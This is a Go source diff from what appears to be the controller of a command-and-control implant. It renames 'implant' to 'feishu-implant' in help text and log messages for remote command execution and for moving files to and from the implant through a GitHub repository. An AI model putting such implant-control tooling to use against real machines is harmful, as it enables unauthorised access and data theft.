@@ -262,9 +262,9 @@ func printHelp() {
 	fmt.Println(" - pwd : print working directory")
 	fmt.Println(" - whoami : get username")
 	fmt.Println(" - cmd <command> : execute command")
-	fmt.Println(" - upload <local_file_path> <remote_file_name> : upload local file to the implant")
-	fmt.Println(" - download <implant_file_path> <remote_file_name> : download file of implant to current local path")
-	fmt.Println(" - exit : kill the connection with the implant")
+	fmt.Println(" - upload <local_file_path> <remote_file_name> : upload local file to the feishu-implant")
+	fmt.Println(" - download <implant_file_path> <remote_file_name> : download file of feishu-implant to current local path")
+	fmt.Println(" - exit : kill the connection with the feishu-implant")
 }
 
 func main() {
@@ -395,9 +395,9 @@ func main() {
 					//implant成功将文件上传到github-repo，标记一下
 					if decoded == "upload success" {
 						success_flag = true
-						fmt.Println("upload implant file", implant_file_path, "to github success...")
+						fmt.Println("upload feishu-implant file", implant_file_path, "to github success...")
 					} else {
-						fmt.Println("upload implant file", implant_file_path, "to github failed...")
+						fmt.Println("upload feishu-implant file", implant_file_path, "to github failed...")
 					}
 					break
 				}
@@ -411,7 +411,7 @@ func main() {
 					fmt.Println("download github file Error:", remote_file_name, err)
 				} else {
 					usertime := time.Since(start_time)
-					fmt.Println("implant file", implant_file_path, "download to local success, time-consuming:", usertime)
+					fmt.Println("feishu-implant file", implant_file_path, "download to local success, time-consuming:", usertime)
 				}
 			} else {
 				fmt.Println("file download fail, please try again")
